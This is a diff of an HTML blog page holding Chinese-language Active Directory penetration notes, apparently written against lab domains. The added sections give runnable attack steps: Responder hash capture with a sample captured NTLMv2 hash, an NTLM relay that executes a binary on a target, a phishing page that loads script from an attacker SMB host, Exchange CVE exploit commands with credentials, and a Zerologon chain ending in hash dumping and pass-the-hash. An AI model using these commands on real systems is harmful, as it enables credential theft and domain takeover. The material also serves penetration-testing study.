@@ -210,9 +210,14 @@
         <li><a href="#kb2871997补丁对域环境的影响">KB2871997补丁对域环境的影响</a></li>
         <li><a href="#委派">委派</a></li>
         <li><a href="#非约束委派攻击">非约束委派攻击</a></li>
-        <li><a href="#约束委派攻击-有点复杂还没有捋顺">约束委派攻击 (有点复杂，还没有捋顺)</a></li>
+        <li><a href="#约束委派攻击">约束委派攻击</a></li>
         <li><a href="#关于约束和非约束委派的思考">关于约束和非约束委派的思考</a></li>
         <li><a href="#资源约束委派攻击">资源约束委派攻击</a></li>
+        <li><a href="#net-ntlm-hash捕获">NET-NTLM-HASH捕获</a></li>
+        <li><a href="#域内邮件服务-针对exchange的攻击">域内邮件服务-针对exchange的攻击</a></li>
+        <li><a href="#域内漏洞">域内漏洞</a></li>
+        <li><a href="#补充">补充</a></li>
+        <li><a href="#横向思路">横向思路</a></li>
       </ul>
     </li>
     <li><a href="#攻击链梳理">攻击链梳理</a></li>
@@ -231,7 +236,7 @@
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
-    <div>文章</div><div class="sidebar-state-number">84</div>
+    <div>文章</div><div class="sidebar-state-number">87</div>
   </div>
   <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
     <div>分类</div>
@@ -1116,9 +1121,9 @@ KB2871997补丁对域环境的影响
 </span></span><span class="line"><span class="cl">    <span class="err">诱捕门槛高：你必须精确知道是哪个业务系统在用这个服务账号。你不能随便发个</span> <span class="n">SMB</span> <span class="err">请求就去骗</span> <span class="n">TGT</span><span class="err">，因为默认的</span> <span class="n">SMB</span> <span class="err">服务是以机器账户运行的。你需要构造特定的请求，去访问那个特定的业务端口（比如</span> <span class="n">HTTP</span> <span class="err">或特定</span> <span class="n">SQL</span> <span class="err">端口）。</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="err">局限性大：就算你拿到了</span> <span class="n">TGT</span><span class="err">，这个服务账号往往权限很低，你可能还得面临二次提权。</span>
-</span></span></code></pre></div><h3 id="约束委派攻击-有点复杂还没有捋顺">
-<a class="header-anchor" href="#%e7%ba%a6%e6%9d%9f%e5%a7%94%e6%b4%be%e6%94%bb%e5%87%bb-%e6%9c%89%e7%82%b9%e5%a4%8d%e6%9d%82%e8%bf%98%e6%b2%a1%e6%9c%89%e6%8d%8b%e9%a1%ba"></a>
-约束委派攻击 (有点复杂，还没有捋顺)
+</span></span></code></pre></div><h3 id="约束委派攻击">
+<a class="header-anchor" href="#%e7%ba%a6%e6%9d%9f%e5%a7%94%e6%b4%be%e6%94%bb%e5%87%bb"></a>
+约束委派攻击
 </h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">原理：
 </span></span><span class="line"><span class="cl">由于非约束委派的不安全性，微软在windows server 2003中引入了约束委派，对Kerberos协议进行了拓展，引入了SService for User to Self (S4U2Self)和 Service for User to Proxy (S4U2proxy)。
 </span></span><span class="line"><span class="cl">
@@ -1302,6 +1307,521 @@ KB2871997补丁对域环境的影响
 </span></span><span class="line"><span class="cl">mimikatz kerberos::ptc administrator.ccache
 </span></span><span class="line"><span class="cl">连接利用票据：
 </span></span><span class="line"><span class="cl">shell dir \\data.xiaodi.local\c$
+</span></span></code></pre></div><h3 id="net-ntlm-hash捕获">
+<a class="header-anchor" href="#net-ntlm-hash%e6%8d%95%e8%8e%b7"></a>
+NET-NTLM-HASH捕获
+</h3><ul>
+<li>使用工具</li>
+</ul>
+<p><a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></p>
+<p><a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a></p>
+<p><a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a></p>
+<ul>
+<li>操作步骤</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Responder -I <span class="o">[</span>网卡名称<span class="o">]</span>         //在攻击机上启用监听，假设此时攻击机IP为192.168.1.1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">使用net use <span class="se">\\</span>192.168.1.1<span class="se">\c</span>$  //通过主动或被动的方式在目标机器上触发访问
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//此时会获取net-NTLM-HASH 
+</span></span><span class="line"><span class="cl">SMB<span class="o">]</span> NTLMv2-SSP Client   : 192.168.3.11
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Username : xd<span class="se">\d</span>badmin
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Hash     : dbadmin::xd:7bfbde3666103da7:0F96B83AB5DD886A6CD9E4BE3524C461:0101000000000000809176CAA6E6DC0115F3BDC627F1A9E40000000002000800510045005400420001001E00570049004E002D004500340059005200480036004F00410044004C00420004003400570049004E002D004500340059005200480036004F00410044004C0042002E0051004500540042002E004C004F00430041004C000300140051004500540042002E004C004F00430041004C000500140051004500540042002E004C004F00430041004C0007000800809176CAA6E6DC01060004000200000008003000300000000000000000000000002000009922928988E5648E3056535193DCF8B8A26B7D41AD967CEF8B839F336CFD22290A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E0033002E00310032003800000000000000000000000000 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="o">[</span>LLMNR<span class="o">]</span>  Poisoned answer sent to fe80::1c37:bf00:760f:4254 <span class="k">for</span> name web
+</span></span></code></pre></div><ul>
+<li>必备知识</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">1.windwos本身的机制：
+</span></span><span class="line"><span class="cl">	因为 Windows 的设计理念是“让用户在局域网里感觉所有电脑像一个整体”，为了实现这种无缝衔接的体验，系统底层被设定为在网络握手时会主动“亮明身份”。因此会主动发送凭据。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2.使用凭证的优先级：
+</span></span><span class="line"><span class="cl">	Windows 在发送当前登录凭据之前，会先翻一翻它的 “小本子”——凭据管理器（Credential Manager）。
+</span></span><span class="line"><span class="cl">	如果有记录：如果你之前访问过 \\192.168.1.10并且保存了专门的密码，Windows 会优先发送那个保存的密码。
+</span></span><span class="line"><span class="cl">	如果没记录：凭据管理器一片空白，Windows 才会“ fallback（退回）”到默认行为——发送你当前桌面的登录凭据。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3.域环境也可以获取net-ntlm-hash
+</span></span><span class="line"><span class="cl">	域环境下会优先使用kerberos协议认证，为什么还会出现net-ntlm-hash呢？因为使用\\192.168.1.10 ,不满足kerberos生成票据的要求，因为kerberos是通过SPN定位的，\\192.168.1.10这种写法不符合SPN格式,会自动将认证协议降级为ntlm认证。如果使用kerberos认证，要使用域名的格式,如，\\share.test.com，这种格式才行。
+</span></span></code></pre></div><ul>
+<li>
+<p>触发方式</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">实际情况下触发，不会让你登进其他服务器使用net use命令。所以可采用以下方式触发。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">使用强制请求漏洞触发
+</span></span><span class="line"><span class="cl">https://github.com/topotam/PetitPotam //单个漏洞
+</span></span><span class="line"><span class="cl">https://github.com/dirkjanm/krbrelayx  //单个漏洞
+</span></span><span class="line"><span class="cl">https://github.com/p0dalirius/Coercer   //漏洞集
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">被动钓鱼：基于文件 网页 命令 诱惑对方去访问监听主机
+</span></span><span class="line"><span class="cl">参考：https://mp.weixin.qq.com/s/O-hYgpryXPJ-fCh8Nqggww
+</span></span><span class="line"><span class="cl">利用LLMNR&amp;NBNS攻击
+</span></span><span class="line"><span class="cl">利用系统命令
+</span></span><span class="line"><span class="cl">利用钓鱼网页
+</span></span><span class="line"><span class="cl">利用office文档
+</span></span><span class="line"><span class="cl">利用系统图标
+</span></span><span class="line"><span class="cl">利用SCF文件
+</span></span><span class="line"><span class="cl">利用PDF文件
+</span></span><span class="line"><span class="cl">利用用户头像设置
+</span></span></code></pre></div></li>
+</ul>
+<p>因为NET-NTLM-HASH不同于NTLM HASH,无法进行横向，所以采取以下方式：</p>
+<h4 id="思路1-爆破出明文">
+<a class="header-anchor" href="#%e6%80%9d%e8%b7%af1-%e7%88%86%e7%a0%b4%e5%87%ba%e6%98%8e%e6%96%87"></a>
+思路1-爆破出明文
+</h4><ul>
+<li>操作</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">hashcat.exe -m 5600 hash.txt pass.txt
+</span></span><span class="line"><span class="cl">hashcat.exe -m 5600 hash.txt pass.txt --show
+</span></span></code></pre></div><ul>
+<li>原理</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">NTLM的认证原理，自己查。
+</span></span></code></pre></div><h4 id="思路2-ntlm-中继攻击ntlm-relay">
+<a class="header-anchor" href="#%e6%80%9d%e8%b7%af2-ntlm-%e4%b8%ad%e7%bb%a7%e6%94%bb%e5%87%bbntlm-relay"></a>
+思路2-NTLM 中继攻击（NTLM Relay）
+</h4><ul>
+<li>必备知识</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">1.工作组环境下的 Windows 的“自动身份验证（Pass-through Authentication）”机制。
+</span></span><span class="line"><span class="cl">* 当你发起访问时，Windows 在后台“默默代劳”
+</span></span><span class="line"><span class="cl">	当你在电脑 A 上双击访问电脑 B 的共享文件夹时，Windows 并不会干等着让你输密码。它会第一时间自动把您当前登录电脑 A 的凭据（也就是当前的用户名和加密后的密码哈希值）打包发给电脑 B。
+</span></span><span class="line"><span class="cl">* 两台电脑的“密码比对”
+</span></span><span class="line"><span class="cl">电脑 B 收到电脑 A 发来的凭据后，会将其与自身的账户数据库进行对比。因为这两台电脑的 Administrator账户不仅名字一样，连密码也完全一致，所以电脑 B 一核对，发现“完全匹配”，便会直接判定你是合法用户，给你放行。
+</span></span><span class="line"><span class="cl">2.
+</span></span></code></pre></div><ul>
+<li>
+<p>工具</p>
+<p>smbrelayx.py</p>
+</li>
+<li>
+<p>前提</p>
+</li>
+</ul>
+<p>​		工作组的环境下：A和B两台机器的本地账户名及密码相同。例如，账户密码都是 administrator/123456.</p>
+<p>​		域环境下：因为域内普通账户本身就可以在域内任意非域控机器登录（无特别权限配置的情况下），所以域内机器默认可以进行中继操作。除非禁止了NTLM协议。但是普通的域账户权限很小只能获取自身的信息，意义不是很大。一般中继到域管账户的凭证，攻击的意义才大。</p>
+<ul>
+<li>操作</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">//在攻击的机上做好监听。-h表示 收到net-ntlm <span class="nb">hash</span> 后要转发的目标机器  -c 表示要执行命令
+</span></span><span class="line"><span class="cl">python smbrelayx.py -h 192.168.3.32 -c hostname      
+</span></span><span class="line"><span class="cl">python smbrelayx.py -h 192.168.3.32 -c c:<span class="se">\\</span>5566.exe
+</span></span></code></pre></div><h3 id="域内邮件服务-针对exchange的攻击">
+<a class="header-anchor" href="#%e5%9f%9f%e5%86%85%e9%82%ae%e4%bb%b6%e6%9c%8d%e5%8a%a1-%e9%92%88%e5%af%b9exchange%e7%9a%84%e6%94%bb%e5%87%bb"></a>
+域内邮件服务-针对exchange的攻击
+</h3><ul>
+<li>
+<p>介绍：</p>
+<p>Exchange Server 是微软公司的一套电子邮件服务组件，是个消息与协作系统。内网中，拿下邮件系统会对接下来的目标寻找起到关键的作用。目前exchange 有Exchange Server 2010、2013、2016及2019等多个版本</p>
+</li>
+<li>
+<p>发现exchange服务</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">1、通过端口扫描
+</span></span><span class="line"><span class="cl">exchange会对外暴露接口如OWA,ECP等，会暴露在80端口，而且25/587/2525等端口上会有SMTP服务，所以可以通过一些端口特征来定位exchange。
+</span></span><span class="line"><span class="cl">2、通过SPN扫描
+</span></span><span class="line"><span class="cl">powershell setspn -T [域] -q */*
+</span></span><span class="line"><span class="cl">3、通过脚本探测服务版本以及可能存在的漏洞。
+</span></span><span class="line"><span class="cl">python Exchange_GetVersion_MatchVul.py xx.xx.xx.xx
+</span></span><span class="line"><span class="cl">对上面脚本的详细说明的文章：https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Exchange%E7%89%88%E6%9C%AC%E6%8E%A2%E6%B5%8B%E5%92%8C%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B
+</span></span><span class="line"><span class="cl">4.微软官方探测版本的方法
+</span></span><span class="line"><span class="cl">https://learn.microsoft.com/zh-cn/exchange/new-features/build-numbers-and-release-dates
+</span></span></code></pre></div><ul>
+<li>利用思路</li>
+</ul>
+<p>exchange的用户 和 域内用户的账户密码都是通用的。</p>
+<p>没有账户密码就尝试爆破，或漏洞利用。</p>
+<p>有域内账户密码，考虑钓鱼+NTLM REelay攻击，或漏洞利用。查看邮件信息，寻找敏感信息，或其他突破口。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mf">1.</span><span class="err">爆破</span>
+</span></span><span class="line"><span class="cl">    <span class="n">a</span><span class="o">.</span><span class="err">建立</span><span class="n">socket节点使用Proxifier连接后</span><span class="err">，再配合</span><span class="n">burp爆破</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">    <span class="n">b</span><span class="o">.</span><span class="err">工具项目：</span>
+</span></span><span class="line"><span class="cl">        <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">sensepost</span><span class="o">/</span><span class="n">ruler</span>
+</span></span><span class="line"><span class="cl">        <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">grayddq</span><span class="o">/</span><span class="n">EBurst</span>
+</span></span><span class="line"><span class="cl">        <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">dafthack</span><span class="o">/</span><span class="n">MailSniper</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl"><span class="mf">2.</span> <span class="err">钓鱼</span><span class="o">+</span><span class="n">NTLM</span> <span class="n">REelay攻击</span><span class="err">（</span><span class="n">Relay</span> <span class="n">To</span> <span class="n">EWS</span><span class="err">）</span>
+</span></span><span class="line"><span class="cl"><span class="err">适合场景：需要域管理员账户触发攻击的意义才大。</span>
+</span></span><span class="line"><span class="cl"><span class="err">注意点：如果需要伪造内网中钓鱼网页，钓鱼网页所在的服务器</span><span class="n">IP需要是域内的</span><span class="err">，否则访问不了。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">-</span><span class="err">利用附件（免杀后门）发给域内其他用户</span>
+</span></span><span class="line"><span class="cl">    <span class="o">-</span><span class="err">利用网站配合监听实现获取</span><span class="n">ntlm</span> <span class="nb">hash</span><span class="p">(</span><span class="err">票据</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">复现环境：</span><span class="n">god</span><span class="o">.</span><span class="n">org域环境</span><span class="p">(</span><span class="n">Exchange</span> <span class="mi">2010</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">responder</span> <span class="o">-</span><span class="n">I</span> <span class="n">eth1</span> <span class="o">-</span><span class="n">wd</span>
+</span></span><span class="line"><span class="cl">    <span class="n">python</span> <span class="n">smbrelayx</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">h</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">3.32</span> <span class="o">-</span><span class="n">c</span> <span class="n">c</span><span class="p">:</span>\\<span class="mf">5566.</span><span class="n">exe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">3.31</span><span class="o">/</span><span class="mf">31.</span><span class="n">html</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;!</span><span class="n">DOCTYPE</span> <span class="n">html</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">html</span> <span class="n">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">&lt;</span><span class="n">meta</span> <span class="n">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">body</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">&lt;</span><span class="n">script</span> <span class="n">src</span><span class="o">=</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">192.168.3.129</span><span class="se">\t</span><span class="s2">est&#34;</span><span class="o">&gt;&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mf">3.</span><span class="err">漏洞利用</span>
+</span></span><span class="line"><span class="cl"><span class="err">确定内核版本</span><span class="o">-</span><span class="err">筛选</span><span class="n">Server版本</span><span class="o">-</span><span class="err">确定漏洞对应关系</span><span class="o">-</span><span class="err">选择漏洞（见图）</span>
+</span></span><span class="line"><span class="cl"><span class="err">漏洞总结复现参考文章：</span>
+</span></span><span class="line"><span class="cl"><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">forum</span><span class="o">.</span><span class="n">butian</span><span class="o">.</span><span class="n">net</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="mi">1837</span>
+</span></span><span class="line"><span class="cl"><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">mp</span><span class="o">.</span><span class="n">weixin</span><span class="o">.</span><span class="n">qq</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">s</span><span class="o">/</span><span class="n">HCtLSx9nzXCAco2NyZkn5Q</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">CVE</span><span class="o">-</span><span class="mi">2020</span><span class="o">-</span><span class="mi">0688</span><span class="err">（用账户密码）</span>
+</span></span><span class="line"><span class="cl"><span class="err">利用条件：</span><span class="n">Exchange</span> <span class="n">Server</span> <span class="mi">2010</span> <span class="n">SP3</span><span class="o">/</span><span class="mi">2013</span><span class="o">/</span><span class="mi">2016</span><span class="o">/</span><span class="mi">2019</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl"><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">Ridter</span><span class="o">/</span><span class="n">cve</span><span class="o">-</span><span class="mi">2020</span><span class="o">-</span><span class="mi">0688</span>
+</span></span><span class="line"><span class="cl"><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">W01fh4cker</span><span class="o">/</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2020</span><span class="o">-</span><span class="mi">0688</span><span class="o">-</span><span class="n">GUI</span>
+</span></span><span class="line"><span class="cl"><span class="err">复现环境：</span><span class="n">rootkit</span><span class="o">.</span><span class="n">org域环境</span><span class="p">(</span><span class="n">Exchange</span> <span class="mi">2013</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">:</span>\<span class="n">Python38</span>\<span class="n">python</span><span class="o">.</span><span class="n">exe</span> <span class="n">cve</span><span class="o">-</span><span class="mi">2020</span><span class="o">-</span><span class="mf">0688.</span><span class="n">py</span> <span class="o">-</span><span class="n">s</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">3.144</span> <span class="o">-</span><span class="n">u</span> <span class="n">rootkit</span><span class="o">.</span><span class="n">org</span>\<span class="n">micle</span> <span class="o">-</span><span class="n">p</span> <span class="n">Admin12345</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&#34;notepad&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">CVE</span><span class="o">-</span><span class="mi">2020</span><span class="o">-</span><span class="mi">17144</span><span class="err">（用账户密码）</span>
+</span></span><span class="line"><span class="cl"><span class="err">需要普通用户凭据的情况下的</span><span class="n">RCE</span><span class="err">，就</span><span class="n">Exchange2010能用</span>
+</span></span><span class="line"><span class="cl"><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">Airboi</span><span class="o">/</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2020</span><span class="o">-</span><span class="mi">17144</span><span class="o">-</span><span class="n">EXP</span>
+</span></span><span class="line"><span class="cl"><span class="err">复现环境：</span><span class="mi">0</span><span class="n">day</span><span class="o">.</span><span class="n">org域环境</span><span class="p">(</span><span class="n">Exchange</span> <span class="mi">2010</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">CVE</span><span class="o">-</span><span class="mi">2020</span><span class="o">-</span><span class="mf">17144.</span><span class="n">exe</span> <span class="n">owa2010sp3</span><span class="o">.</span><span class="mi">0</span><span class="n">day</span><span class="o">.</span><span class="n">org</span> <span class="n">jack</span> <span class="n">admin</span><span class="o">!</span><span class="err">@</span><span class="c1">#45</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ProxyShell</span> <span class="err">漏洞利用链（不用账户密码）</span>
+</span></span><span class="line"><span class="cl"><span class="n">CVE</span><span class="o">-</span><span class="mi">2021</span><span class="o">-</span><span class="mi">34473</span> <span class="n">Microsoft</span> <span class="n">Exchange</span> <span class="n">ACL绕过漏洞</span>
+</span></span><span class="line"><span class="cl"><span class="n">CVE</span><span class="o">-</span><span class="mi">2021</span><span class="o">-</span><span class="mi">34523</span> <span class="n">Microsoft</span> <span class="n">Exchange权限提升漏洞</span>
+</span></span><span class="line"><span class="cl"><span class="n">CVE</span><span class="o">-</span><span class="mi">2021</span><span class="o">-</span><span class="mi">31207</span> <span class="n">Microsoft</span> <span class="n">Exchange授权任意文件写入漏洞</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl"><span class="err">攻击者可通过组合这些漏洞在未经身份验证的情况下远程接管目标服务器。</span>
+</span></span><span class="line"><span class="cl"><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">horizon3ai</span><span class="o">/</span><span class="n">proxyshell</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mf">4.</span><span class="err">从</span> <span class="n">Exchange</span> <span class="err">服务器下载邮件，搜索邮件，获取人员信息等</span>
+</span></span><span class="line"><span class="cl"><span class="err">项目：</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">simonlee</span><span class="o">-</span><span class="n">hello</span><span class="o">/</span><span class="n">EWSTool</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">:</span>\<span class="n">Python38</span>\<span class="n">python</span><span class="o">.</span><span class="n">exe</span> <span class="n">ewstools</span><span class="o">.</span><span class="n">py</span> <span class="o">--</span><span class="n">host</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">3.144</span> <span class="o">-</span><span class="n">u</span> <span class="n">rootkit</span><span class="o">.</span><span class="n">org</span>\<span class="n">micle</span> <span class="o">-</span><span class="n">p</span> <span class="n">Admin12345</span> <span class="n">people</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ProxyShell</span> <span class="err">漏洞利用链</span>
+</span></span><span class="line"><span class="cl"><span class="n">CVE</span><span class="o">-</span><span class="mi">2021</span><span class="o">-</span><span class="mi">34473</span> <span class="n">Microsoft</span> <span class="n">Exchange</span> <span class="n">ACL绕过漏洞</span>
+</span></span><span class="line"><span class="cl"><span class="n">CVE</span><span class="o">-</span><span class="mi">2021</span><span class="o">-</span><span class="mi">34523</span> <span class="n">Microsoft</span> <span class="n">Exchange权限提升漏洞</span>
+</span></span><span class="line"><span class="cl"><span class="n">CVE</span><span class="o">-</span><span class="mi">2021</span><span class="o">-</span><span class="mi">31207</span> <span class="n">Microsoft</span> <span class="n">Exchange授权任意文件写入漏洞</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl"><span class="err">攻击者可通过组合这些漏洞在未经身份验证的情况下远程接管目标服务器。</span>
+</span></span><span class="line"><span class="cl"><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">horizon3ai</span><span class="o">/</span><span class="n">proxyshell</span>
+</span></span></code></pre></div><h3 id="域内漏洞">
+<a class="header-anchor" href="#%e5%9f%9f%e5%86%85%e6%bc%8f%e6%b4%9e"></a>
+域内漏洞
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">#实战场景：
+</span></span><span class="line"><span class="cl">通过技术手段拿下内网域环境下某一台服务器权限或某主机上的域用户账号密码后，与AD域控网络通讯正常的情况下，可直接使用域控提权CVE漏洞进行域控权限提升。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#横向移动-域控提权-CVE-2020-1472
+</span></span><span class="line"><span class="cl">CVE-2020-1472是一个windows域控中最严重的远程权限提升漏洞，攻击者通过NetLogon，建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限
+</span></span><span class="line"><span class="cl">Windows Server 2008 R2 for x64-based Systems Service Pack 1
+</span></span><span class="line"><span class="cl">Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
+</span></span><span class="line"><span class="cl">Windows Server 2012
+</span></span><span class="line"><span class="cl">Windows Server 2012 (Server Core installation)
+</span></span><span class="line"><span class="cl">Windows Server 2012 R2
+</span></span><span class="line"><span class="cl">Windows Server 2012 R2 (Server Core installation)
+</span></span><span class="line"><span class="cl">Windows Server 2016
+</span></span><span class="line"><span class="cl">Windows Server 2016 (Server Core installation)
+</span></span><span class="line"><span class="cl">Windows Server 2019
+</span></span><span class="line"><span class="cl">Windows Server 2019 (Server Core installation)
+</span></span><span class="line"><span class="cl">Windows Server, version 1903 (Server Core installation)
+</span></span><span class="line"><span class="cl">Windows Server, version 1909 (Server Core installation)
+</span></span><span class="line"><span class="cl">Windows Server, version 2004 (Server Core installation)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">0、获取计算机名：
+</span></span><span class="line"><span class="cl">net group &#34;domain controllers&#34; /domain
+</span></span><span class="line"><span class="cl">1、Socks代理后：
+</span></span><span class="line"><span class="cl">修改Host绑定域名和IP
+</span></span><span class="line"><span class="cl">2、连接DC清空凭证：
+</span></span><span class="line"><span class="cl">https://github.com/dirkjanm/CVE-2020-1472
+</span></span><span class="line"><span class="cl">python cve-2020-1472-exploit.py OWA2010CN-GOD 192.168.3.21
+</span></span><span class="line"><span class="cl">3、获取域内HASH:
+</span></span><span class="line"><span class="cl">python secretsdump.py &#34;god.org/owa2010cn-god$@192.168.3.21&#34; -no-pass
+</span></span><span class="line"><span class="cl">4、连接域控PTH：
+</span></span><span class="line"><span class="cl">python wmiexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21
+</span></span><span class="line"><span class="cl">5、后续恢复密码：
+</span></span><span class="line"><span class="cl">https://github.com/risksense/zerologon
+</span></span><span class="line"><span class="cl">https://github.com/SecureAuthCorp/impacket
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#横向移动-域控提权-CVE-2021-42287
+</span></span><span class="line"><span class="cl">CVE-2021-42278，机器账户的名字一般来说应该以$结尾，但AD没有对域内机器账户名做验证。CVE-2021-42287，与上述漏洞配合使用，创建与DC机器账户名字相同的机器账户（不以$结尾），账户请求一个TGT后，更名账户，然后通过S4U2self申请TGS Ticket，接着DC在TGS_REP阶段，这个账户不存在的时候，DC会使用自己的密钥加密TGS Ticket，提供一个属于该账户的PAC，然后我们就得到了一个高权限ST。
+</span></span><span class="line"><span class="cl">前提条件：一个域内普通账号
+</span></span><span class="line"><span class="cl">影响版本：Windows基本全系列
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1、Socks代理后：
+</span></span><span class="line"><span class="cl">修改Host绑定域名和IP
